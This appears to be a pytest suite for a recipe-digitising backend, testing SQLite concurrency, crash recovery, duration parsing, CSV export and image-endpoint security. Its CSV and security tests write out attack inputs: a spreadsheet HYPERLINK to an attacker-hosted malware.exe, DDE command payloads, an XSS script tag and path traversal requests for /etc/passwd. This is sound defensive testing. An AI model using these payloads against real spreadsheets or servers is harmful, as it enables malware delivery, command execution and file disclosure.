"""Adversarial challenge test suite for Milestone 1: Backend & Storage Foundations.

Empirical verification of:
1. SQLite Concurrency & Locking: Multithreaded racing writes, updates, reads, and deletes across SessionStore.
2. Crash Simulation & Resumption: State recovery, card/proposal/recipe rehydration from SQLite on cold restarts.
3. Extreme ISO 8601 Duration Conversions: Comprehensive boundary, unit, fraction, and garbage string inputs.
4. Plan To Eat CSV RFC 4180 Compliance: Massive ingredient lists, multiline newlines, embedded quotes, commas, formula injection defense.
5. Card Image Streaming Security: Path traversal payloads (relative, absolute, URL-encoded, null bytes) against /api/cards/{card_id}/image.
6. API Resilience & SSE Telemetry: Fast-firing state transitions and recipe CRUD integrity.
"""

from __future__ import annotations

import asyncio
import csv
import io
import json
import os
import shutil
import tempfile
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, AsyncGenerator, Dict, List, Optional
import httpx
import pytest
import pytest_asyncio
from httpx import ASGITransport
from PIL import Image

from recipeboxer.agent.session import PipelineSession, SessionManager
from recipeboxer.api.app import create_app
from recipeboxer.exporter.json_ld import (
    JsonLdExporter,
    export_recipes_to_json_ld,
    human_duration_to_iso8601,
)
from recipeboxer.exporter.plan_to_eat import (
    PLAN_TO_EAT_COLUMNS,
    PlanToEatExporter,
    export_recipes_to_plan_to_eat_csv,
)
from recipeboxer.exporter.json_export import JsonExporter, export_recipes_to_json
from recipeboxer.models.hitl import ApprovalPayload, CardPairApproval
from recipeboxer.models.pipeline import (
    IngestionMode,
    PipelineStartRequest,
    PipelineState,
    ProgressMetrics,
    TokenUsage,
)
from recipeboxer.models.recipe import RecipeSchema
from recipeboxer.models.session import SessionDetail, SessionSummary
from recipeboxer.storage.session_store import SessionStore, get_session_store


def _create_synthetic_test_image(dest_path: Path, width: int = 150, height: int = 100) -> Path:
    """Helper to generate a valid synthetic JPEG image."""
    dest_path.parent.mkdir(parents=True, exist_ok=True)
    img = Image.new("RGB", (width, height), color=(245, 235, 215))
    img.save(dest_path, format="JPEG")
    return dest_path


# ============================================================================
# PART 1: SQLITE CONCURRENCY & STRESS TESTS
# ============================================================================

class TestSQLiteConcurrencyAndStress:
    """Empirical concurrency stress tests for SQLite SessionStore."""

    def test_multithreaded_concurrent_session_and_recipe_operations(self, tmp_path: Path):
        """Stress test SQLite SessionStore with 40 concurrent threads performing racing reads, writes, and updates."""
        db_file = tmp_path / "concurrent_store.db"
        store = SessionStore(db_path=db_file)

        num_threads = 40
        ops_per_thread = 25
        errors: List[Exception] = []

        def worker(thread_idx: int) -> None:
            try:
                for i in range(ops_per_thread):
                    sid = f"sess_t{thread_idx % 8}"  # Shared sessions across threads to force lock/update collisions
                    rec_id = f"rec_t{thread_idx}_op{i}"

                    # 1. Save / update session
                    store.save_session(
                        session_id=sid,
                        state=PipelineState.INGESTING,
                        folder_path=f"/tmp/scans/{sid}",
                        card_count=10,
                        recipe_count=i,
                    )

                    # 2. Save card
                    store.save_card(
                        session_id=sid,
                        card_id=f"card_t{thread_idx}_{i}.jpg",
                        image_path=f"/tmp/scans/{sid}/card_{i}.jpg",
                        sha256_hash=f"{thread_idx:02x}{i:04x}".ljust(64, "0"),
                    )

                    # 3. Save recipe
                    recipe = RecipeSchema(
                        recipe_id=rec_id,
                        title=f"Recipe Thread {thread_idx} Iteration {i}",
                        description="Stress test recipe description",
                        ingredients=[f"Ingredient {k} for {rec_id}" for k in range(5)],
                        directions=[f"{k+1}. Step {k} for {rec_id}" for k in range(3)],
                    )
                    store.save_recipe(session_id=sid, recipe=recipe)

                    # 4. Read operations
                    _ = store.get_session(sid)
                    _ = store.get_session_summary(sid)
                    _ = store.get_cards(sid)
                    _ = store.get_recipe(rec_id, session_id=sid)
                    _ = store.list_recipes(session_id=sid)

            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=worker, args=(t,)) for t in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30.0)
            assert not t.is_alive(), "A worker thread hung during concurrent SQLite execution"

        store.close()
        assert errors == [], f"Concurrent SQLite operations generated errors: {errors}"

        # Reopen and verify database integrity and records
        with SessionStore(db_path=db_file) as verify_store:
            sessions = verify_store.list_sessions()
            assert len(sessions) == 8
            for s in sessions:
                assert s.card_count > 0
                assert s.recipe_count > 0

    def test_cascading_deletes_consistency(self, tmp_path: Path):
        """Verify deleting a session completely cleans up all linked cards, proposals, and recipes."""
        db_file = tmp_path / "cascade_test.db"
        store = SessionStore(db_path=db_file)

        sid = "sess_cascade_target"
        store.save_session(session_id=sid, state=PipelineState.COMPLETED)

        # Add 10 cards
        for i in range(10):
            store.save_card(sid, card_id=f"c_{i}.jpg", image_path=f"/path/{i}.jpg")

        # Add 5 recipes
        for i in range(5):
            rec = RecipeSchema(
                recipe_id=f"rec_cascade_{i}",
                title=f"Cascade Recipe {i}",
                ingredients=["Flour", "Sugar"],
                directions=["1. Mix.", "2. Bake."],
            )
            store.save_recipe(sid, rec)

        # Verify initial population
        assert len(store.get_cards(sid)) == 10
        assert len(store.list_recipes(sid)) == 5
        assert store.get_session_summary(sid) is not None

        # Delete session
        deleted = store.delete_session(sid)
        assert deleted is True

        # Verify full cascading deletion
        assert store.get_session(sid) is None
        assert store.get_session_summary(sid) is None
        assert store.get_session_detail(sid) is None
        assert store.get_cards(sid) == []
        assert store.list_recipes(sid) == []

        store.close()

    def test_recipe_count_and_card_count_accuracy_under_concurrent_churn(self, tmp_path: Path):
        """Verify card_count and recipe_count in sessions table match actual rows under rapid insertions and deletions."""
        db_file = tmp_path / "count_churn.db"
        store = SessionStore(db_path=db_file)
        sid = "sess_churn"
        store.save_session(sid, state=PipelineState.EXTRACTING)

        # Insert 30 cards and 20 recipes
        for i in range(30):
            store.save_card(sid, f"card_{i}.jpg", f"/path/card_{i}.jpg")
        for i in range(20):
            store.save_recipe(
                sid,
                RecipeSchema(recipe_id=f"rec_{i}", title=f"Churn Recipe {i}", ingredients=["Salt"]),
            )

        summary = store.get_session_summary(sid)
        assert summary is not None
        assert summary.card_count == 30
        assert summary.recipe_count == 20

        # Delete 8 recipes
        for i in range(8):
            assert store.delete_recipe(f"rec_{i}", session_id=sid) is True

        summary_after = store.get_session_summary(sid)
        assert summary_after is not None
        assert summary_after.card_count == 30
        assert summary_after.recipe_count == 12
        assert len(store.list_recipes(sid)) == 12

        store.close()


# ============================================================================
# PART 2: SESSION CRASH RESUMPTION & STATE RECOVERY
# ============================================================================

class TestSessionCrashResumption:
    """Empirical verification of session rehydration and crash recovery."""

    @pytest.mark.asyncio
    async def test_cold_start_session_resumption_from_sqlite(self, tmp_path: Path):
        """Simulate cold-start server reboot: load state exclusively from SQLite and resume pipeline."""
        db_file = tmp_path / "crash_recovery.db"
        scans_dir = tmp_path / "scans"
        scans_dir.mkdir()

        # Generate 4 dummy card images
        img_paths = [_create_synthetic_test_image(scans_dir / f"card_{i:02d}.jpg") for i in range(4)]

        sid = "sess_crashed_mid_flight"

        # Phase 1: Store session state prior to 'crash'
        init_store = SessionStore(db_path=db_file)
        init_store.save_session(
            session_id=sid,
            state=PipelineState.HITL_PENDING,
            mode="parallel",
            folder_path=str(scans_dir),
            config={
                "scans_dir": str(scans_dir),
                "mode": "parallel",
                "max_concurrency": 3,
                "model": "gemini-3.7-flash",
            },
            progress=ProgressMetrics(
                total_scans=4,
                fingerprinted_scans=4,
                proposed_pairs=2,
                unassigned_cards=0,
                percent_complete=50.0,
            ),
            token_usage=TokenUsage(prompt_tokens=1200, response_tokens=350, total_tokens=1550),
            card_count=4,
            recipe_count=1,
        )

        for p in img_paths:
            init_store.save_card(sid, card_id=p.name, image_path=str(p))

        # Add 1 pre-extracted recipe
        init_store.save_recipe(
            sid,
            RecipeSchema(
                recipe_id="rec_pre_crash_01",
                title="Grandma's Cinnamon Rolls",
                description="Warm, pillowy rolls with vanilla cream glaze.",
                ingredients=["3 cups flour", "1 packet yeast", "1 cup warm milk", "1/2 cup sugar"],
                directions=["1. Knead dough.", "2. Roll out with cinnamon sugar.", "3. Bake at 350F."],
                tags=["Baking", "Breakfast"],
            ),
        )
        init_store.close()

        # Phase 2: Fresh Application Instance (Simulating process reboot / cold start)
        new_manager = SessionManager()
        new_store = SessionStore(db_path=db_file)
        app = create_app(session_manager=new_manager, session_store=new_store)

        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            # 1. Verify session listing contains persisted session
            res_list = await client.get("/api/sessions")
            assert res_list.status_code == 200
            sessions = res_list.json()
            assert any(s["session_id"] == sid for s in sessions)

            # 2. Get session detail
            res_detail = await client.get(f"/api/sessions/{sid}")
            assert res_detail.status_code == 200
            detail = res_detail.json()
            assert detail["session_id"] == sid
            assert detail["status"] == "HITL_PENDING"
            assert detail["card_count"] == 4
            assert detail["recipe_count"] == 1
            assert len(detail["cards"]) == 4
            assert len(detail["recipes"]) == 1
            assert detail["recipes"][0]["title"] == "Grandma's Cinnamon Rolls"
            assert detail["token_usage"]["total_tokens"] == 1550

            # 3. Post resume endpoint
            res_resume = await client.post(f"/api/sessions/{sid}/resume")
            assert res_resume.status_code == 200
            resumed_data = res_resume.json()
            assert resumed_data["session_id"] == sid
            assert resumed_data["status"] == "HITL_PENDING"

            # 4. Stream card image from rehydrated session
            res_img = await client.get(f"/api/cards/card_00.jpg/image?session_id={sid}")
            assert res_img.status_code == 200
            assert "image/jpeg" in res_img.headers["content-type"]

        new_store.close()

    @pytest.mark.asyncio
    async def test_resume_nonexistent_session_returns_404(self, tmp_path: Path):
        """Verify calling resume on unknown session returns 404 cleanly."""
        store = SessionStore(db_path=tmp_path / "empty.db")
        app = create_app(session_store=store)
        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            res = await client.post("/api/sessions/sess_ghost_123/resume")
            assert res.status_code == 404
            assert "not found" in res.json()["detail"].lower()
        store.close()


# ============================================================================
# PART 3: EXTREME ISO 8601 DURATION CONVERSIONS
# ============================================================================

class TestExtremeISO8601DurationConversions:
    """Stress tests and boundary condition verification for ISO 8601 duration parser."""

    @pytest.mark.parametrize(
        "input_str, expected_output",
        [
            # Standard human formats
            ("20 mins", "PT20M"),
            ("1 hr 15 mins", "PT1H15M"),
            ("2 hours", "PT2H"),
            ("45 seconds", "PT45S"),
            ("1 day 2 hours", "P1DT2H"),
            ("2 days 4 hours 30 mins 15 secs", "P2DT4H30M15S"),
            # Abbreviated units
            ("1h 30m", "PT1H30M"),
            ("45m", "PT45M"),
            ("10s", "PT10S"),
            ("2d", "P2D"),
            ("1d 3h", "P1DT3H"),
            ("1hr, 20min", "PT1H20M"),
            ("2 hrs.", "PT2H"),
            ("45 minutes", "PT45M"),
            # Bare numbers (fallback to minutes)
            ("30", "PT30M"),
            ("45", "PT45M"),
            ("120", "PT120M"),
            ("5", "PT5M"),
            # Pre-formatted valid ISO 8601 durations
            ("PT30M", "PT30M"),
            ("PT1H15M", "PT1H15M"),
            ("P1DT2H", "P1DT2H"),
            ("PT45S", "PT45S"),
            ("P2D", "P2D"),
            # Extreme large numbers
            ("1000 hours", "PT1000H"),
            ("999999 mins", "PT999999M"),
            ("365 days", "P365D"),
            # Mixed spacing and casing
            ("  1  HOUR  15  MINUTES  ", "PT1H15M"),
            ("45 MINS", "PT45M"),
            ("\t2 hours\n", "PT2H"),
        ],
    )
    def test_valid_and_boundary_duration_conversions(self, input_str: str, expected_output: str):
        """Verify parser converts various human duration strings into correct ISO 8601 format."""
        result = human_duration_to_iso8601(input_str)
        assert result == expected_output, f"Failed for input '{input_str}': expected {expected_output}, got {result}"

    @pytest.mark.parametrize(
        "invalid_input",
        [
            "",
            "   ",
            None,
            "N/A",
            "none",
            "to taste",
            "until golden brown",
            "overnight",
            "P",
            "PT",
            "not a duration",
            "!@#$%^&*()",
            "--",
            "NULL",
        ],
    )
    def test_invalid_and_empty_duration_strings_return_none(self, invalid_input: Optional[str]):
        """Verify invalid or unparseable durations return None without raising exceptions."""
        result = human_duration_to_iso8601(invalid_input)
        assert result is None, f"Expected None for invalid input '{invalid_input}', got '{result}'"

    def test_schema_org_json_ld_integration_with_extreme_durations(self):
        """Verify JsonLdExporter generates valid Schema.org Recipe JSON with diverse durations."""
        recipes = [
            RecipeSchema(
                title="Overnight Sourdough Loaf",
                prep_time="30 mins",
                cook_time="45 mins",
                total_time="1 day 4 hours",
                ingredients=["500g flour", "350ml water", "100g starter", "10g salt"],
                directions=["1. Mix and autolyse.", "2. Bulk ferment overnight.", "3. Bake at 450F."],
            ),
            RecipeSchema(
                title="Quick 5-Minute Mug Cake",
                prep_time="2 mins",
                cook_time="1 min",
                total_time="5",
                ingredients=["3 tbsp flour", "2 tbsp sugar", "1 tbsp cocoa", "2 tbsp milk"],
                directions=["1. Mix in mug.", "2. Microwave 60s."],
            ),
            RecipeSchema(
                title="Grandma's Slow Roast Pork",
                prep_time="20 mins",
                cook_time="4 hours",
                total_time="4 hrs 30 mins",
                ingredients=["2kg pork shoulder", "Garlic", "Rosemary", "Olive oil"],
                directions=["1. Season pork.", "2. Roast at 300F for 4 hours."],
            ),
        ]

        exporter = JsonLdExporter()
        json_ld_dict = exporter.export_to_json_ld_dict(recipes)
        json_ld_str = exporter.export_to_json_ld_string(recipes)

        assert exporter.validate_json_ld(json_ld_dict) is True
        assert exporter.validate_json_ld(json_ld_str) is True

        # Verify ISO 8601 conversion within generated graph
        graph = json_ld_dict["@graph"]
        assert graph[0]["prepTime"] == "PT30M"
        assert graph[0]["cookTime"] == "PT45M"
        assert graph[0]["totalTime"] == "P1DT4H"

        assert graph[1]["prepTime"] == "PT2M"
        assert graph[1]["cookTime"] == "PT1M"
        assert graph[1]["totalTime"] == "PT5M"

        assert graph[2]["prepTime"] == "PT20M"
        assert graph[2]["cookTime"] == "PT4H"
        assert graph[2]["totalTime"] == "PT4H30M"


# ============================================================================
# PART 4: PLAN TO EAT CSV RFC 4180 COMPLIANCE & MULTILINE STRESS
# ============================================================================

class TestPlanToEatCSVRFC4180Stress:
    """Stress tests for Plan To Eat CSV exporter with RFC 4180 compliance, quotes, newlines, commas, and formula injection."""

    def test_massive_ingredient_list_and_complex_delimiters(self, tmp_path: Path):
        """Stress test CSV exporter with 1,000 ingredients containing quotes, commas, newlines, tabs, and semicolons."""
        massive_ingredients = []
        for i in range(1000):
            massive_ingredients.append(
                f'{i+1} cup "Grade A" organic whole-wheat flour, sifted; pinch of salt (item #{i})\n[Sub-note: use brand "King Arthur"]'
            )

        complex_directions = [
            '1. In a large bowl, mix "flour, sugar, and baking powder" vigorously.',
            '2. Add 2 eggs; whisk until smooth.\r\nNote: Do NOT overmix!\r\nEnsure temperature is 350°F.',
            '3. Pour into 9"x13" greased pan and bake for 30 minutes.',
            '4. "Let cool completely" before slicing.\nEnjoy with tea!',
        ]

        recipe = RecipeSchema(
            title='Classic "Old-Fashioned" Pound Cake, Special Edition: 100% Homemade!',
            description='A rich, buttery pound cake passed down for 3 generations.\n"Best served with fresh strawberries & heavy cream."',
            yield_servings='12-16 "generous" slices',
            prep_time="25 mins",
            cook_time="1 hr 15 mins",
            total_time="1 hr 40 mins",
            ingredients=massive_ingredients,
            directions=complex_directions,
            tags=['Baking', 'Pound Cake', 'Family "Favorites"', 'Dessert, Cakes'],
            source_notes='Handwritten index card from Aunt Clara\'s wooden box (1962).\r\nCatalog #AC-109.',
        )

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([recipe])

        # 1. Verify internal validation helper
        assert exporter.validate_csv_format(csv_str) is True

        # 2. Strict RFC 4180 roundtrip parsing using Python's standard csv.reader
        reader = csv.reader(io.StringIO(csv_str), delimiter=",", quotechar='"')
        rows = list(reader)

        assert len(rows) == 2  # Header row + 1 data row
        header = rows[0]
        data = rows[1]

        assert header == PLAN_TO_EAT_COLUMNS
        assert len(data) == 9

        # Column 0: Title
        assert data[0] == 'Classic "Old-Fashioned" Pound Cake, Special Edition: 100% Homemade!'
        # Column 1: Description
        assert data[1] == 'A rich, buttery pound cake passed down for 3 generations.\n"Best served with fresh strawberries & heavy cream."'
        # Column 2: Ingredients (All 1000 items preserved verbatim with internal linebreaks)
        parsed_ingredients = data[2].split("\n")
        assert len(parsed_ingredients) >= 1000
        assert '1 cup "Grade A" organic whole-wheat flour' in data[2]
        # Column 3: Directions
        assert '1. In a large bowl, mix "flour, sugar, and baking powder" vigorously.' in data[3]
        assert '3. Pour into 9"x13" greased pan and bake for 30 minutes.' in data[3]
        # Column 7: Tags
        assert data[7] == 'Baking, Pound Cake, Family "Favorites", Dessert, Cakes'
        # Column 8: Source
        assert "Aunt Clara's wooden box (1962)" in data[8]

        # 3. File write roundtrip
        out_file = tmp_path / "massive_pte.csv"
        exporter.export_to_file([recipe], out_file)
        assert out_file.exists()
        assert out_file.stat().st_size > 50000  # Over 50KB for 1000 items

    def test_formula_injection_and_special_character_resilience(self):
        """Verify recipes with spreadsheet formula prefixes (=, +, -, @, |) and control chars export safely."""
        recipes = [
            RecipeSchema(
                title='=HYPERLINK("http://attacker.com/malware.exe", "Free Recipe!")',
                description='@SUM(1+1)*cmd|\' /C calc\'!A0',
                ingredients=[
                    '+1-2 tbsp vinegar',
                    '-1/2 cup sugar',
                    '=cmd|\' /C calc\'!A0',
                    '| pipe character ingredient',
                    '\tTabbed ingredient with comma, and "quotes"',
                ],
                directions=[
                    '1. Step with =formula injection.',
                    '2. Step with @symbol and <script>alert("xss")</script>.',
                ],
                tags=['=DDE("cmd")', '+Formula', '@Tag'],
                source_notes='=1+1',
            )
        ]

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string(recipes)

        reader = csv.reader(io.StringIO(csv_str))
        rows = list(reader)
        assert len(rows) == 2
        data = rows[1]

        # Verify quotes escaped properly and fields parsed without splitting columns
        assert data[0] == '=HYPERLINK("http://attacker.com/malware.exe", "Free Recipe!")'
        assert data[1] == '@SUM(1+1)*cmd|\' /C calc\'!A0'
        assert len(data) == 9

    def test_empty_recipes_list_csv_export(self):
        """Exporting an empty recipe list produces a valid CSV with only the header row."""
        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([])
        assert csv_str == "Title,Description,Ingredients,Directions,Prep Time,Total Time,Yield,Tags,Source\r\n"
        assert exporter.validate_csv_format(csv_str) is True


# ============================================================================
# PART 5: CARD IMAGE SECURITY & PATH TRAVERSAL TESTS
# ============================================================================

class TestCardImageSecurityAndPathTraversal:
    """Empirical adversarial security testing for GET /api/cards/{card_id}/image."""

    @pytest.mark.asyncio
    async def test_unscoped_filesystem_fallback_allows_reading_arbitrary_local_files(
        self, tmp_path: Path
    ):
        """Verify that arbitrary local files (e.g. pyproject.toml, /etc/passwd) cannot be read via /api/cards/{card_id}/image."""
        store = SessionStore(db_path=tmp_path / "sec_audit.db")
        app = create_app(session_store=store)

        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            # Requesting 'pyproject.toml' must return 404 NOT_FOUND
            res = await client.get("/api/cards/pyproject.toml/image")
            assert res.status_code == 404
            assert "not found" in res.json()["detail"].lower()

            # Requesting path traversal payloads must return 404
            res_traversal = await client.get("/api/cards/..%2F..%2Fetc%2Fpasswd/image")
            assert res_traversal.status_code in (400, 404)

        store.close()

    @pytest.mark.asyncio
    async def test_legitimate_card_streaming_with_cache_headers(self, tmp_path: Path):
        """Verify registered card images stream with correct Content-Type and Cache-Control headers."""
        scans_dir = tmp_path / "valid_scans"
        scans_dir.mkdir()
        img_path = _create_synthetic_test_image(scans_dir / "recipe_card_front.jpg")

        store = SessionStore(db_path=tmp_path / "valid_stream.db")
        sid = "sess_stream_valid"
        store.save_session(sid, state=PipelineState.INGESTING)
        store.save_card(sid, card_id="recipe_card_front.jpg", image_path=str(img_path))

        app = create_app(session_store=store)
        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            res = await client.get(f"/api/cards/recipe_card_front.jpg/image?session_id={sid}")
            assert res.status_code == 200
            assert "image/jpeg" in res.headers["content-type"]
            assert "public, max-age=86400" in res.headers.get("cache-control", "")
            assert len(res.content) == img_path.stat().st_size

        store.close()


# ============================================================================
# PART 6: API RESILIENCE, SSE TELEMETRY & RECIPE MUTATION
# ============================================================================

class TestAPIResilienceAndSSE:
    """Stress tests for FastAPI routes, SSE streaming, and recipe CRUD validation."""

    @pytest.mark.asyncio
    async def test_recipe_validation_bounds_on_create_and_update(self, tmp_path: Path):
        """Verify invalid recipe payloads (e.g. blank title, invalid JSON) return 422 Unprocessable Entity."""
        store = SessionStore(db_path=tmp_path / "validation.db")
        app = create_app(session_store=store)
        transport = ASGITransport(app=app)

        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            # 1. Missing title
            res1 = await client.post("/api/recipes", json={"description": "No title provided"})
            assert res1.status_code == 422

            # 2. Blank whitespace title
            res2 = await client.post("/api/recipes", json={"title": "   \n\t  "})
            assert res2.status_code == 422

            # 3. Update non-existent recipe returns 404
            res3 = await client.put(
                "/api/recipes/rec_nonexistent_999",
                json={"title": "Valid Title", "ingredients": ["Salt"]},
            )
            assert res3.status_code == 404

        store.close()

    @pytest.mark.asyncio
    async def test_sse_stream_fast_connect_and_disconnect(self, tmp_path: Path):
        """Verify SSE endpoint /api/events handles client connections and transitions to terminal state."""
        manager = SessionManager()
        store = SessionStore(db_path=tmp_path / "sse_stress.db")
        app = create_app(session_manager=manager, session_store=store)

        sid = "sess_sse_test"
        session = manager.create_session(session_id=sid)
        session.state = PipelineState.INGESTING

        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            # Set session to COMPLETED after short delay so stream terminates cleanly
            async def complete_session():
                await asyncio.sleep(0.1)
                session.state = PipelineState.COMPLETED

            asyncio.create_task(complete_session())

            async with client.stream("GET", f"/api/events?session_id={sid}") as response:
                assert response.status_code == 200
                assert "text/event-stream" in response.headers["content-type"]
                events_received = []
                async for chunk in response.aiter_text():
                    for line in chunk.split("\n"):
                        if line.startswith("event:"):
                            events_received.append(line)
                    if any("completed" in e for e in events_received):
                        break

            assert len(events_received) >= 1

        store.close()

    @pytest.mark.asyncio
    async def test_rapid_concurrent_recipe_updates(self, tmp_path: Path):
        """Stress test concurrent inline recipe edits on the same recipe."""
        store = SessionStore(db_path=tmp_path / "concurrent_recipe.db")
        manager = SessionManager()
        app = create_app(session_manager=manager, session_store=store)

        sid = "sess_rec_race"
        store.save_session(sid, state=PipelineState.COMPLETED)

        rec_id = "rec_race_target"
        init_recipe = RecipeSchema(
            recipe_id=rec_id,
            title="Initial Title",
            yield_servings="4 servings",
            ingredients=["1 cup sugar"],
            directions=["1. Stir."],
        )
        store.save_recipe(sid, init_recipe)

        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            async def update_worker(worker_idx: int) -> None:
                payload = {
                    "recipe_id": rec_id,
                    "title": f"Updated Title from Worker {worker_idx}",
                    "yield_servings": f"{worker_idx * 2} servings",
                    "ingredients": [f"{worker_idx} cups flour", "1 cup sugar"],
                    "directions": [f"1. Worker {worker_idx} step."],
                }
                res = await client.put(f"/api/recipes/{rec_id}?session_id={sid}", json=payload)
                assert res.status_code == 200

            # Execute 20 concurrent updates
            tasks = [update_worker(i) for i in range(20)]
            await asyncio.gather(*tasks)

            # Verify recipe is intact
            final_res = await client.get(f"/api/recipes/{rec_id}?session_id={sid}")
            assert final_res.status_code == 200
            final_data = final_res.json()
            assert "Updated Title from Worker" in final_data["title"]
            assert len(final_data["ingredients"]) == 2

        store.close()
